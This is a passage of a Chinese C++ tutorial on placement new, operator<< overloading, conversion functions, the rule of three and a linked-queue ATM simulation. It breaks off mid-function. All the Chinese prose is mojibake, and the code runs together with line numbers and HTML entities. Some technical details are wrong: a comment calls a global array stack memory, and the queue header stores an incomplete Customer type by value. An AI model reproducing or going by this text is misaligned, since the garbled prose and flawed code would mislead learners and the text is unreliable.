åœ¨æŸäº›åµŒå…¥å¼ç³»ç»Ÿæˆ–åº•å±‚ç¼–ç¨‹ä¸­ï¼Œå¯èƒ½éœ€è¦åœ¨ç‰¹å®šçš„ç¡¬ä»¶åœ°å€ä¸Šåˆ›å»ºå¯¹è±¡ã€‚ ä¼˜åŒ–: åœ¨æ€§èƒ½è¦æ±‚æé«˜çš„åœºæ™¯ä¸‹ï¼Œå¦‚æœèƒ½é¢„å…ˆåˆ†é…å¥½å†…å­˜ï¼Œå®šä½ new å¯ä»¥çœå»æ ‡å‡† new çš„å†…å­˜æŸ¥æ‰¾å¼€é”€ã€‚ é”€æ¯å®šä½ new åˆ›å»ºçš„å¯¹è±¡: å®šä½ new åªè´Ÿè´£è°ƒç”¨æ„é€ å‡½æ•°ï¼Œå®ƒä¸è´Ÿè´£å†…å­˜ç®¡ç†ã€‚å› æ­¤ï¼Œä½ ä¸èƒ½å¯¹é€šè¿‡å®šä½ new è·å–çš„æŒ‡é’ˆä½¿ç”¨æ ‡å‡†çš„ deleteã€‚æ ‡å‡†çš„ delete ä¼šå°è¯•é‡Šæ”¾å†…å­˜ï¼Œä½†è¿™å—å†…å­˜ä¸æ˜¯ç”±æ ‡å‡† new åˆ†é…çš„ï¼ˆæˆ–è€…ä½ æ‰“ç®—é‡ç”¨å®ƒï¼‰ã€‚ è¦é”€æ¯é€šè¿‡å®šä½ new åˆ›å»ºçš„å¯¹è±¡ï¼Œä½ éœ€è¦æ˜¾å¼åœ°è°ƒç”¨è¯¥å¯¹è±¡çš„ææ„å‡½æ•°ï¼š 1ptr-&gt;~ClassName(); // æ˜¾å¼è°ƒç”¨ææ„å‡½æ•° ptr-&gt;~ClassName(): è¿™æ˜¯è°ƒç”¨ææ„å‡½æ•°çš„è¯­æ³•ã€‚å®ƒæ‰§è¡Œå¯¹è±¡çš„æ¸…ç†å·¥ä½œï¼Œä½†ä¸é‡Šæ”¾å†…å­˜ã€‚ å†…å­˜çš„é‡Šæ”¾ç”±ç®¡ç† buffer çš„ä»£ç è´Ÿè´£ï¼ˆä¾‹å¦‚ï¼Œå¦‚æœ buffer æ˜¯ä¸€ä¸ªå¤§çš„ char æ•°ç»„ï¼Œå®ƒä¼šåœ¨æ•°ç»„ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶è‡ªåŠ¨é‡Šæ”¾ï¼›å¦‚æœæ˜¯é€šè¿‡æ ‡å‡† new åˆ†é…çš„ï¼Œåˆ™éœ€è¦å¯¹åº”çš„ delete []ï¼‰ã€‚ ç¤ºä¾‹: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253#include &lt;iostream&gt;#include &lt;new&gt; // for placement new#include &quot;string1.h&quot; // å‡è®¾ String ç±»æœ‰é»˜è®¤å’Œ C-string æ„é€ å‡½æ•°åŠææ„å‡½æ•°const int BUF = 512;char buffer[BUF]; // é¢„å…ˆåˆ†é…çš„å†…å­˜ç¼“å†²åŒº (é™æ€å­˜å‚¨)int main() &#123; using std::cout; using std::endl; String *p1, *p2; cout &lt;&lt; &quot;Block 1: placement new in buffer:\\n&quot;; p1 = new (buffer) String(&quot;Hello&quot;); // åœ¨ buffer å¼€å§‹å¤„æ„é€  String(&quot;Hello&quot;) // è®¡ç®— buffer ä¸­ä¸‹ä¸€ä¸ªå¯ç”¨åœ°å€ // æ³¨æ„ï¼šè¿™åªæ˜¯ä¸€ä¸ªç®€åŒ–ç¤ºä¾‹ï¼Œå®é™…å†…å­˜æ± ç®¡ç†éœ€è¦æ›´å¤æ‚çš„å¯¹é½å’Œå¤§å°è®¡ç®— size_t available_space = BUF - sizeof(String); void * next_loc = buffer + sizeof(String); if (available_space &gt;= sizeof(String)) &#123; p2 = new (next_loc) String(&quot;World&quot;); // åœ¨ buffer çš„ä¸‹ä¸€ä¸ªä½ç½®æ„é€  String(&quot;World&quot;) &#125; else &#123; cout &lt;&lt; &quot;Not enough space for p2.\\n&quot;; p2 = nullptr; &#125; cout &lt;&lt; &quot;Memory addresses:\\n&quot; &lt;&lt; &quot;buffer: &quot; &lt;&lt; (void *) buffer &lt;&lt; &quot; p1: &quot; &lt;&lt; p1 &lt;&lt; &quot; p2: &quot; &lt;&lt; p2 &lt;&lt; endl; cout &lt;&lt; &quot;p1: &quot; &lt;&lt; *p1 &lt;&lt; endl; if (p2) cout &lt;&lt; &quot;p2: &quot; &lt;&lt; *p2 &lt;&lt; endl; // æ˜¾å¼é”€æ¯å¯¹è±¡ (æŒ‰æ„é€ ç›¸åé¡ºåºé€šå¸¸æ˜¯å¥½ä¹ æƒ¯) cout &lt;&lt; &quot;\\nDestroying objects:\\n&quot;; if (p2) &#123; p2-&gt;~String(); // è°ƒç”¨ p2 æŒ‡å‘å¯¹è±¡çš„ææ„å‡½æ•° cout &lt;&lt; &quot;p2 destroyed.\\n&quot;; &#125; p1-&gt;~String(); // è°ƒç”¨ p1 æŒ‡å‘å¯¹è±¡çš„ææ„å‡½æ•° cout &lt;&lt; &quot;p1 destroyed.\\n&quot;; // buffer å†…å­˜æœ¬èº«ä¼šåœ¨ main ç»“æŸæ—¶è‡ªåŠ¨é‡Šæ”¾ (å› ä¸ºå®ƒæ˜¯æ ˆä¸Šçš„æ•°ç»„) cout &lt;&lt; &quot;\\nBlock 2: Standard new/delete:\\n&quot;; String * p3 = new String(&quot;Standard new&quot;); cout &lt;&lt; &quot;p3: &quot; &lt;&lt; *p3 &lt;&lt; &quot; at &quot; &lt;&lt; p3 &lt;&lt; endl; delete p3; // ä½¿ç”¨æ ‡å‡† deleteï¼Œå®ƒä¼šè°ƒç”¨ææ„å‡½æ•°å¹¶é‡Šæ”¾å†…å­˜ cout &lt;&lt; &quot;p3 deleted.\\n&quot;; return 0;&#125; æ€»ç»“: æŒ‡å‘å¯¹è±¡çš„æŒ‡é’ˆæ˜¯ç®¡ç†åŠ¨æ€åˆ›å»ºå¯¹è±¡çš„å¸¸ç”¨æ–¹å¼ã€‚ new ClassName(args) åˆ†é…å†…å­˜å¹¶è°ƒç”¨æ„é€ å‡½æ•°ã€‚ delete ptr è°ƒç”¨ææ„å‡½æ•°å¹¶é‡Šæ”¾å†…å­˜ã€‚ new ClassName[size] åˆ†é…æ•°ç»„å¹¶è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•°ã€‚ delete [] ptr è°ƒç”¨æ•°ç»„å…ƒç´ çš„ææ„å‡½æ•°å¹¶é‡Šæ”¾å†…å­˜ã€‚ ä½¿ç”¨ -&gt; è¿ç®—ç¬¦é€šè¿‡æŒ‡é’ˆè®¿é—®å¯¹è±¡æˆå‘˜ã€‚ å®šä½ new (new (address) ClassName(args)) åœ¨æŒ‡å®šåœ°å€æ„é€ å¯¹è±¡ï¼Œä¸åˆ†é…å†…å­˜ã€‚ å®šä½ new åˆ›å»ºçš„å¯¹è±¡å¿…é¡»é€šè¿‡æ˜¾å¼è°ƒç”¨ææ„å‡½æ•° (ptr-&gt;~ClassName()) æ¥é”€æ¯ï¼Œå†…å­˜éœ€å¦å¤–ç®¡ç†ã€‚ 12.6 å¤ä¹ å„ç§æŠ€æœ¯æœ¬ç« æˆ‘ä»¬æ·±å…¥æ¢è®¨äº†ç±»å¦‚ä½•ä¸åŠ¨æ€å†…å­˜åˆ†é…äº¤äº’ï¼Œä»¥åŠä¸ºäº†æ­£ç¡®ç®¡ç†èµ„æºå’Œé¿å…é”™è¯¯æ‰€å¿…é¡»é‡‡ç”¨çš„æŠ€æœ¯ã€‚æœ¬èŠ‚å°†ç®€è¦å›é¡¾å…¶ä¸­å‡ ä¸ªå…³é”®æŠ€æœ¯ç‚¹ã€‚ 12.6.1 é‡è½½ &lt;&lt; è¿ç®—ç¬¦ä¸ºäº†æ–¹ä¾¿åœ°è¾“å‡ºå¯¹è±¡çš„çŠ¶æ€ï¼Œæˆ‘ä»¬ç»å¸¸ä¸ºè‡ªå®šä¹‰ç±»é‡è½½è¾“å‡ºè¿ç®—ç¬¦ &lt;&lt;ã€‚ å®ç°æ–¹å¼: é€šå¸¸å®ç°ä¸ºéæˆå‘˜å‹å…ƒå‡½æ•°ã€‚ éæˆå‘˜: å› ä¸ºå·¦æ“ä½œæ•°æ˜¯ std::ostream å¯¹è±¡ï¼ˆå¦‚ coutï¼‰ï¼Œè€Œä¸æ˜¯æˆ‘ä»¬è‡ªå®šä¹‰ç±»çš„å¯¹è±¡ã€‚è°ƒç”¨å½¢å¼æ˜¯ operator&lt;&lt;(cout, myObject)ã€‚ å‹å…ƒ: å› ä¸ºå®ƒé€šå¸¸éœ€è¦è®¿é—®ç±»çš„ private æ•°æ®æˆå‘˜æ¥è·å–è¦è¾“å‡ºçš„ä¿¡æ¯ã€‚ å‡½æ•°ç­¾å: friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const ClassName &amp; obj); ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ ostream å¯¹è±¡çš„å¼•ç”¨ã€‚ ç¬¬äºŒä¸ªå‚æ•°é€šå¸¸æ˜¯å¾…è¾“å‡ºå¯¹è±¡çš„ const å¼•ç”¨ï¼ˆå› ä¸ºè¾“å‡ºæ“ä½œä¸åº”ä¿®æ”¹å¯¹è±¡ï¼‰ã€‚ è¿”å› ostream å¯¹è±¡çš„å¼•ç”¨ï¼Œä»¥æ”¯æŒé“¾å¼è¾“å‡ºï¼ˆcout &lt;&lt; obj1 &lt;&lt; obj2;ï¼‰ã€‚ å®ç°: å‡½æ•°å†…éƒ¨è®¿é—®å¯¹è±¡çš„æˆå‘˜ï¼Œå¹¶å°†å®ƒä»¬æ ¼å¼åŒ–è¾“å‡ºåˆ°ä¼ å…¥çš„ ostream å¯¹è±¡ os ä¸­ã€‚ ç¤ºä¾‹ (å›é¡¾ String ç±»): 12345678910111213141516// string1.h excerptclass String &#123; // ... private: char * str; int len; ... friend std::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const String &amp; st); // ...&#125;;// string1.cpp excerptstd::ostream &amp; operator&lt;&lt;(std::ostream &amp; os, const String &amp; st) &#123; os &lt;&lt; st.str; // å‹å…ƒå‡½æ•°è®¿é—®ç§æœ‰æˆå‘˜ str return os;&#125;// ä½¿ç”¨String greeting(&quot;Hello&quot;);std::cout &lt;&lt; &quot;Message: &quot; &lt;&lt; greeting &lt;&lt; std::endl; // è°ƒç”¨ operator&lt;&lt;(cout, greeting) 12.6.2 è½¬æ¢å‡½æ•°è½¬æ¢å‡½æ•°å…è®¸ç±»å¯¹è±¡è¢«éšå¼æˆ–æ˜¾å¼åœ°è½¬æ¢ä¸ºå…¶ä»–ç±»å‹ã€‚ è¯­æ³•: operator typeName() const; å¿…é¡»æ˜¯æˆå‘˜å‡½æ•°ã€‚ æ²¡æœ‰å£°æ˜è¿”å›ç±»å‹ã€‚ é€šå¸¸æ²¡æœ‰å‚æ•°ã€‚ é€šå¸¸å£°æ˜ä¸º constï¼Œå› ä¸ºè½¬æ¢æ“ä½œä¸åº”ä¿®æ”¹å¯¹è±¡çŠ¶æ€ã€‚ åŠŸèƒ½: å®šä¹‰äº†ä»å½“å‰ç±»ç±»å‹åˆ° typeName ç±»å‹çš„è½¬æ¢è§„åˆ™ã€‚ explicit (C++11): å¯ä»¥ä½¿ç”¨ explicit å…³é”®å­—é˜»æ­¢éšå¼è½¬æ¢ï¼Œåªå…è®¸æ˜¾å¼è½¬æ¢ï¼ˆå¦‚ static_castï¼‰ã€‚è¿™æœ‰åŠ©äºé¿å…æ„å¤–è½¬æ¢å’ŒäºŒä¹‰æ€§ã€‚ ç¤ºä¾‹ (å›é¡¾ Stones ç±»): 1234567891011121314151617181920212223// stones.h excerptclass Stones &#123; // ... private: double pounds; ...public: // ... explicit operator double() const; // æ˜¾å¼è½¬æ¢ä¸º double explicit operator int() const; // æ˜¾å¼è½¬æ¢ä¸º int&#125;;// stones.cpp excerptStones::operator double() const &#123; return pounds;&#125;Stones::operator int() const &#123; return int(pounds + 0.5); // å››èˆäº”å…¥&#125;// ä½¿ç”¨Stones stone_obj(100.7);// double weight = stone_obj; // é”™è¯¯ï¼å› ä¸ºæ˜¯ explicitdouble weight = static_cast&lt;double&gt;(stone_obj); // OK: æ˜¾å¼è½¬æ¢int int_weight = static_cast&lt;int&gt;(stone_obj); // OK: æ˜¾å¼è½¬æ¢std::cout &lt;&lt; &quot;Weight: &quot; &lt;&lt; weight &lt;&lt; std::endl; æ³¨æ„äº‹é¡¹: è°¨æ…ä½¿ç”¨éšå¼è½¬æ¢å‡½æ•°ï¼Œå®ƒä»¬å¯èƒ½å¯¼è‡´ä»£ç è¡Œä¸ºéš¾ä»¥é¢„æµ‹æˆ–äº§ç”ŸäºŒä¹‰æ€§ã€‚ä¼˜å…ˆä½¿ç”¨ explicitã€‚ é¿å…æä¾›ç›¸äº’å†²çªæˆ–æ¨¡ç³Šçš„è½¬æ¢è·¯å¾„ã€‚ 12.6.3 å…¶æ„é€ å‡½æ•°ä½¿ç”¨ new çš„ç±»è¿™æ˜¯æœ¬ç« çš„æ ¸å¿ƒå†…å®¹ã€‚å½“ç±»çš„æ„é€ å‡½æ•°ä½¿ç”¨ new æ¥åˆ†é…åŠ¨æ€å†…å­˜ï¼Œå¹¶ä¸”ç±»è´Ÿè´£ç®¡ç†è¿™å—å†…å­˜ï¼ˆå³åœ¨ææ„å‡½æ•°ä¸­ä½¿ç”¨ deleteï¼‰æ—¶ï¼Œå¿…é¡»ç‰¹åˆ«æ³¨æ„å¯¹è±¡çš„å¤åˆ¶å’Œèµ‹å€¼è¡Œä¸ºã€‚ é—®é¢˜: ç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤å¤åˆ¶æ„é€ å‡½æ•°å’Œé»˜è®¤èµ‹å€¼è¿ç®—ç¬¦æ‰§è¡Œæµ…å¤åˆ¶ï¼ˆåªå¤åˆ¶æŒ‡é’ˆåœ°å€ï¼‰ï¼Œå¯¼è‡´ï¼š å¤šä¸ªå¯¹è±¡æŒ‡å‘åŒä¸€å—å†…å­˜ã€‚ ææ„æ—¶å‘ç”Ÿ**é‡å¤åˆ é™¤ (double deletion)**ã€‚ èµ‹å€¼æ—¶å¯èƒ½å‘ç”Ÿå†…å­˜æ³„æ¼ï¼ˆæ—§å†…å­˜æœªé‡Šæ”¾ï¼‰ã€‚ è§£å†³æ–¹æ¡ˆ (ä¸‰/äº”æ³•åˆ™):å¿…é¡»æä¾›è‡ªå®šä¹‰çš„ç‰¹æ®Šæˆå‘˜å‡½æ•°æ¥æ‰§è¡Œæ·±å¤åˆ¶å¹¶æ­£ç¡®ç®¡ç†å†…å­˜ï¼š ææ„å‡½æ•° (~ClassName()): å¿…é¡»å®šä¹‰ã€‚ è´Ÿè´£ä½¿ç”¨ delete æˆ– delete[] é‡Šæ”¾æ„é€ å‡½æ•°ä¸­é€šè¿‡ new åˆ†é…çš„æ‰€æœ‰å†…å­˜ã€‚ å¤åˆ¶æ„é€ å‡½æ•° (ClassName(const ClassName &amp;)): å¿…é¡»å®šä¹‰ã€‚ ä¸ºæ–°å¯¹è±¡åˆ†é…è‡ªå·±çš„å†…å­˜ã€‚ å°†æºå¯¹è±¡çš„æ•°æ®å¤åˆ¶åˆ°æ–°åˆ†é…çš„å†…å­˜ä¸­ã€‚ å¤åˆ¶èµ‹å€¼è¿ç®—ç¬¦ (ClassName &amp; operator=(const ClassName &amp;)): å¿…é¡»å®šä¹‰ã€‚ æ£€æŸ¥è‡ªæˆ‘èµ‹å€¼ (if (this == &amp;other) return *this;)ã€‚ é‡Šæ”¾å½“å‰å¯¹è±¡ (*this) çš„æ—§å†…å­˜ã€‚ ä¸ºå½“å‰å¯¹è±¡åˆ†é…æ–°çš„å†…å­˜ã€‚ å°†æºå¯¹è±¡çš„æ•°æ®å¤åˆ¶åˆ°æ–°åˆ†é…çš„å†…å­˜ä¸­ã€‚ è¿”å›å¯¹å½“å‰å¯¹è±¡ (*this) çš„å¼•ç”¨ã€‚ ç¤ºä¾‹ (å›é¡¾ String ç±»å…³é”®éƒ¨åˆ†): 12345678910111213141516171819202122232425262728293031323334353637// string1.h excerptclass String &#123;private: char * str; int len; // ...public: String(const char * s); // Constructor using new String(const String &amp; st); // Copy constructor (deep copy) ~String(); // Destructor using delete[] String &amp; operator=(const String &amp; st); // Assignment operator (deep copy) String &amp; operator=(const char * s); // Another assignment overload // ...&#125;;// string1.cpp excerpt (å®ç°æ·±å¤åˆ¶)String::String(const String &amp; st) &#123; // Copy Constructor len = st.len; str = new char [len + 1]; std::strcpy(str, st.str); // ... (update static count etc.)&#125;String::~String() &#123; // Destructor delete [] str; // ... (update static count etc.)&#125;String &amp; String::operator=(const String &amp; st) &#123; // Assignment Operator if (this == &amp;st) return *this; delete [] str; // Free old string len = st.len; str = new char [len + 1]; std::strcpy(str, st.str); return *this;&#125; ç°ä»£ C++ (é›¶æ³•åˆ™):å¦‚æœå¯èƒ½ï¼Œå°½é‡é¿å…æ‰‹åŠ¨ç®¡ç†åŸå§‹æŒ‡é’ˆå’Œ new/deleteã€‚ä½¿ç”¨æ ‡å‡†åº“æä¾›çš„å®¹å™¨ï¼ˆå¦‚ std::string, std::vectorï¼‰å’Œæ™ºèƒ½æŒ‡é’ˆï¼ˆå¦‚ std::unique_ptr, std::shared_ptrï¼‰ã€‚è¿™äº›ç±»å·²ç»å†…ç½®äº†æ­£ç¡®çš„èµ„æºç®¡ç†å’Œå¤åˆ¶/ç§»åŠ¨è¯­ä¹‰ï¼Œéµå¾ª RAII åŸåˆ™ã€‚å¦‚æœä½ çš„ç±»åªåŒ…å«è¿™ç±»æˆå‘˜ï¼Œé€šå¸¸å°±ä¸éœ€è¦ç¼–å†™è‡ªå®šä¹‰çš„ææ„å‡½æ•°ã€å¤åˆ¶/ç§»åŠ¨æ„é€ å‡½æ•°æˆ–èµ‹å€¼è¿ç®—ç¬¦ï¼Œç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤ç‰ˆæœ¬å°±èƒ½æ­£ç¡®å·¥ä½œï¼ˆé›¶æ³•åˆ™ï¼‰ã€‚ æŒæ¡è¿™äº›æŠ€æœ¯å¯¹äºç¼–å†™å®‰å…¨ã€å¥å£®ä¸”èƒ½æ­£ç¡®å¤„ç†åŠ¨æ€å†…å­˜çš„ C++ ç±»è‡³å…³é‡è¦ã€‚ 12.7 é˜Ÿåˆ—æ¨¡æ‹Ÿæœ¬ç« æˆ‘ä»¬å­¦ä¹ äº†ç±»å’ŒåŠ¨æ€å†…å­˜åˆ†é…ï¼Œç°åœ¨æˆ‘ä»¬å°†è¿™äº›çŸ¥è¯†åº”ç”¨äºä¸€ä¸ªå®é™…é—®é¢˜ï¼šæ¨¡æ‹Ÿé“¶è¡Œ ATM çš„å®¢æˆ·é˜Ÿåˆ—ã€‚é€šè¿‡æ¨¡æ‹Ÿï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æä¸åŒæ¡ä»¶ä¸‹ï¼ˆå¦‚ä¸åŒçš„å®¢æˆ·åˆ°è¾¾ç‡ã€ä¸åŒçš„é˜Ÿåˆ—æœ€å¤§é•¿åº¦ï¼‰å®¢æˆ·çš„å¹³å‡ç­‰å¾…æ—¶é—´ï¼Œå¸®åŠ©é“¶è¡Œåšå‡ºå†³ç­–ã€‚ æ¨¡æ‹Ÿåœºæ™¯: æœ‰ä¸€ä¸ª ATM æœºã€‚ å®¢æˆ·éšæœºåˆ°è¾¾ï¼Œå¹³å‡æ¯å°æ—¶åˆ°è¾¾ä¸€å®šæ•°é‡çš„å®¢æˆ·ã€‚ å®¢æˆ·åˆ°è¾¾åï¼Œå¦‚æœ ATM ç©ºé—²ä¸”é˜Ÿåˆ—ä¸ºç©ºï¼Œåˆ™ç›´æ¥ä½¿ç”¨ ATMã€‚ å¦‚æœ ATM ç¹å¿™æˆ–é˜Ÿåˆ—éç©ºï¼Œå®¢æˆ·è¿›å…¥é˜Ÿåˆ—ç­‰å¾…ã€‚ é˜Ÿåˆ—æœ‰æœ€å¤§é•¿åº¦é™åˆ¶ï¼Œå¦‚æœå®¢æˆ·åˆ°è¾¾æ—¶é˜Ÿåˆ—å·²æ»¡ï¼Œåˆ™å®¢æˆ·ç¦»å¼€ï¼ˆè¢«æ‹’ç»æœåŠ¡ï¼‰ã€‚ æ¯ä¸ªå®¢æˆ·çš„äº¤æ˜“æ—¶é—´æ˜¯éšæœºçš„ï¼ˆåœ¨æŸä¸ªèŒƒå›´å†…ï¼‰ã€‚ æˆ‘ä»¬æƒ³æ¨¡æ‹Ÿä¸€æ®µæ—¶é—´ï¼ˆä¾‹å¦‚ 100 å°æ—¶ï¼‰ï¼Œç„¶åç»Ÿè®¡ï¼šæœåŠ¡çš„æ€»å®¢æˆ·æ•°ã€è¢«æ‹’ç»çš„æ€»å®¢æˆ·æ•°ã€å¹³å‡é˜Ÿåˆ—é•¿åº¦ã€å¹³å‡å®¢æˆ·ç­‰å¾…æ—¶é—´ã€‚ å®ç°æ€è·¯: ä¸ºäº†å®ç°è¿™ä¸ªæ¨¡æ‹Ÿï¼Œæˆ‘ä»¬éœ€è¦ä¸¤ä¸ªä¸»è¦çš„ç±»ï¼š Customer ç±»: ç”¨äºè¡¨ç¤ºä¸€ä¸ªå®¢æˆ·ã€‚å®ƒéœ€è¦å­˜å‚¨å®¢æˆ·çš„å…³é”®ä¿¡æ¯ï¼š åˆ°è¾¾æ—¶é—´ (Arrival Time): å®¢æˆ·ä½•æ—¶åŠ å…¥é˜Ÿåˆ—ã€‚ äº¤æ˜“æ‰€éœ€æ—¶é—´ (Processing Time): å®¢æˆ·åœ¨ ATM ä¸Šéœ€è¦èŠ±è´¹å¤šé•¿æ—¶é—´ã€‚ Queue ç±»: ç”¨äºè¡¨ç¤ºç­‰å¾…é˜Ÿåˆ—ã€‚è¿™æ˜¯ä¸€ä¸ªå…¸å‹çš„å…ˆè¿›å…ˆå‡º (FIFO - First-In, First-Out) æ•°æ®ç»“æ„ã€‚æˆ‘ä»¬éœ€è¦èƒ½å¤Ÿï¼š å°†å®¢æˆ·æ·»åŠ åˆ°é˜Ÿå°¾ (enqueue)ã€‚ ä»é˜Ÿé¦–ç§»é™¤å®¢æˆ· (dequeue)ã€‚ æ£€æŸ¥é˜Ÿåˆ—æ˜¯å¦ä¸ºç©º (is_empty)ã€‚ æ£€æŸ¥é˜Ÿåˆ—æ˜¯å¦å·²æ»¡ (is_full)ã€‚ è·å–å½“å‰é˜Ÿåˆ—ä¸­çš„å®¢æˆ·æ•°é‡ (queue_count)ã€‚ ç”±äºé˜Ÿåˆ—çš„é•¿åº¦å¯èƒ½åœ¨è¿è¡Œæ—¶å˜åŒ–ï¼ˆå®¢æˆ·åŠ å…¥å’Œç¦»å¼€ï¼‰ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯èƒ½éœ€è¦å¤„ç†æ½œåœ¨çš„å¤§é‡å®¢æˆ·ï¼Œä½¿ç”¨åŠ¨æ€å†…å­˜åˆ†é…æ¥å®ç° Queue ç±»æ˜¯åˆé€‚çš„ã€‚æˆ‘ä»¬å°†ä½¿ç”¨**é“¾å¼é˜Ÿåˆ— (Linked Queue)**ï¼Œå…¶ä¸­æ¯ä¸ªèŠ‚ç‚¹åŒ…å«ä¸€ä¸ª Customer å¯¹è±¡å’Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆã€‚ 12.7.1 é˜Ÿåˆ—ç±» (Queue Class)è®¾è®¡è¦ç‚¹: èŠ‚ç‚¹ç»“æ„ (Node): åœ¨ Queue ç±»å†…éƒ¨å®šä¹‰ä¸€ä¸ªç§æœ‰çš„ Node ç»“æ„ï¼ˆæˆ–ç±»ï¼‰ï¼ŒåŒ…å«ä¸€ä¸ª Customer å¯¹è±¡ï¼ˆé¡¹ç›®ï¼‰å’Œä¸€ä¸ªæŒ‡å‘ä¸‹ä¸€ä¸ª Node çš„æŒ‡é’ˆã€‚ æ•°æ®æˆå‘˜: front: æŒ‡å‘é˜Ÿé¦–èŠ‚ç‚¹çš„æŒ‡é’ˆã€‚ rear: æŒ‡å‘é˜Ÿå°¾èŠ‚ç‚¹çš„æŒ‡é’ˆã€‚ items: å½“å‰é˜Ÿåˆ—ä¸­çš„é¡¹ç›®æ•°ï¼ˆå®¢æˆ·æ•°ï¼‰ã€‚ qsize: é˜Ÿåˆ—çš„æœ€å¤§å®¹é‡ï¼ˆæ„é€ æ—¶æŒ‡å®šï¼‰ã€‚ ç‰¹æ®Šæˆå‘˜å‡½æ•° (å¤„ç†åŠ¨æ€å†…å­˜): æ„é€ å‡½æ•°: åˆå§‹åŒ–é˜Ÿåˆ—ä¸ºç©ºï¼Œè®¾ç½®æœ€å¤§å®¹é‡ã€‚ ææ„å‡½æ•°: é‡Šæ”¾æ‰€æœ‰èŠ‚ç‚¹å ç”¨çš„å†…å­˜ï¼Œé˜²æ­¢å†…å­˜æ³„æ¼ã€‚ å¤åˆ¶æ„é€ å‡½æ•°: å®ç°æ·±å¤åˆ¶ï¼Œåˆ›å»ºä¸€ä¸ªå®Œå…¨ç‹¬ç«‹çš„é˜Ÿåˆ—å‰¯æœ¬ï¼ˆå¦‚æœéœ€è¦å¤åˆ¶é˜Ÿåˆ—ï¼‰ã€‚ èµ‹å€¼è¿ç®—ç¬¦: å®ç°æ·±å¤åˆ¶èµ‹å€¼ï¼Œå¤„ç†è‡ªæˆ‘èµ‹å€¼å’Œå†…å­˜ç®¡ç†ã€‚ (æ³¨æ„ï¼šå¯¹äºè¿™ä¸ªæ¨¡æ‹Ÿï¼Œæˆ‘ä»¬å¯èƒ½ä¸éœ€è¦å¤åˆ¶æˆ–èµ‹å€¼é˜Ÿåˆ—ï¼Œå¯ä»¥è€ƒè™‘ç¦ç”¨å®ƒä»¬æˆ–ä½¿ç”¨é»˜è®¤è¡Œä¸ºï¼Œä½†å®Œæ•´çš„ç±»è®¾è®¡åº”è€ƒè™‘è¿™äº›) å…¬æœ‰æˆå‘˜å‡½æ•° (é˜Ÿåˆ—æ“ä½œ): bool isempty() const; bool isfull() const; int queuecount() const; bool enqueue(const Customer &amp;item); // æ·»åŠ å®¢æˆ·åˆ°é˜Ÿå°¾ bool dequeue(Customer &amp;item); // ä»é˜Ÿé¦–ç§»é™¤å®¢æˆ·ï¼Œå¹¶é€šè¿‡å¼•ç”¨å‚æ•°è¿”å› queue.h (Queue ç±»å®šä¹‰) 1234567891011121314151617181920212223242526272829303132333435363738394041424344#ifndef QUEUE_H_#define QUEUE_H_// å‰å‘å£°æ˜ Customer ç±»class Customer;// ä¸ºäº†ç®€åŒ–ï¼Œæˆ‘ä»¬ç›´æ¥ä½¿ç”¨ Customer ç±»å‹ï¼Œè€Œä¸æ˜¯æ¨¡æ¿typedef Customer Item;class Queue &#123;private: // å†…éƒ¨èŠ‚ç‚¹ç»“æ„ struct Node &#123; Item item; // å­˜å‚¨çš„æ•°æ® (Customer å¯¹è±¡) Node * next; // æŒ‡å‘ä¸‹ä¸€ä¸ªèŠ‚ç‚¹çš„æŒ‡é’ˆ &#125;; enum &#123; Q_SIZE = 10 &#125;; // é»˜è®¤é˜Ÿåˆ—å¤§å° (å¯ä»¥ä¿®æ”¹) Node * front; // æŒ‡å‘é˜Ÿé¦–çš„æŒ‡é’ˆ Node * rear; // æŒ‡å‘é˜Ÿå°¾çš„æŒ‡é’ˆ int items; // å½“å‰é˜Ÿåˆ—ä¸­çš„é¡¹ç›®æ•° const int qsize; // é˜Ÿåˆ—æœ€å¤§å®¹é‡ (const æˆå‘˜) // å¤åˆ¶æ„é€ å‡½æ•°å’Œèµ‹å€¼è¿ç®—ç¬¦è®¾ä¸ºç§æœ‰ï¼Œä»¥ç¦æ­¢å¤åˆ¶ (ç®€å•å¤„ç†æ–¹å¼) // å¦‚æœéœ€è¦å¤åˆ¶ï¼Œåˆ™éœ€è¦å®ç°æ·±å¤åˆ¶ Queue(const Queue &amp; q) : qsize(0) &#123; &#125; Queue &amp; operator=(const Queue &amp; q) &#123; return *this; &#125;public: // æ„é€ å‡½æ•°ï¼Œå¯ä»¥æŒ‡å®šæœ€å¤§å®¹é‡ Queue(int qs = Q_SIZE); // ææ„å‡½æ•° ~Queue(); bool isempty() const &#123; return items == 0; &#125; bool isfull() const &#123; return items == qsize; &#125; int queuecount() const &#123; return items; &#125; // æ·»åŠ é¡¹ç›®åˆ°é˜Ÿå°¾ bool enqueue(const Item &amp;item); // ä»é˜Ÿé¦–ç§»é™¤é¡¹ç›® bool dequeue(Item &amp;item); // item ç”¨äºæ¥æ”¶å‡ºé˜Ÿçš„æ•°æ®&#125;;#endif // QUEUE_H_ queue.cpp (Queue ç±»å®ç°) 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970#include &quot;queue.h&quot;#include &lt;cstdlib&gt; // for std::rand() - ä»…ç”¨äº Customer ç¤ºä¾‹ï¼ŒQueue æœ¬èº«ä¸éœ€è¦// --- Customer ç±»å®šä¹‰ (ç®€å•ç‰ˆæœ¬ï¼Œæ”¾åœ¨è¿™é‡Œä»…ä¸ºç¼–è¯‘ Queue) ---// å®é™…åº”ç”¨ä¸­åº”æ”¾åœ¨å•ç‹¬çš„ customer.h/cppclass Customer &#123;private: long arrive; // arrival time for customer int processtime; // processing time for customerpublic: Customer() : arrive(0), processtime(0) &#123;&#125; // default constructor void set(long when) &#123; processtime = std::rand() % 3 + 1; // éšæœºå¤„ç†æ—¶é—´ 1-3 åˆ†é’Ÿ arrive = when; &#125; long when() const &#123; return arrive; &#125; int ptime() const &#123; return processtime; &#125;&#125;;// --- Customer ç±»å®šä¹‰ç»“æŸ ---// Queue æ–¹æ³•å®ç°Queue::Queue(int qs) : qsize(qs) &#123; // 